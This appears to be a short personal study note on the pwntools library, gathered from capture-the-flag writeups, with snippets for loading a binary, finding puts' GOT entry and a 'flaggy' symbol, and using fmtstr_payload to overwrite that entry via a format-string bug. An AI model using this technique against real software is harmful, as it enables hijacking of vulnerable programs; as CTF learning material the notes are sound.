## Stuff I learned about pwntool while reading writeups.

* Basic Setup
```
from pwn import *

elf = ELF("./binary")
p = elf.process()
```

* Inbuilt feature of the pwntools ELF class to make getting the location of puts' GOT entry and the some **X** function easy.
```
puts_got = elf.got["puts"]
flaggy_address = elf.symbols["flaggy"]
```

* The **fmtstr_payload** takes in two parameters. The first is the offset at which you read the start of the buffer and second parameter is a dictionary; the keys are where you wish to write to, and the values are what you want to write there.
```
payload = fmtstr_payload(4, {puts_got : flaggy_address})
p.sendline(payload)
```
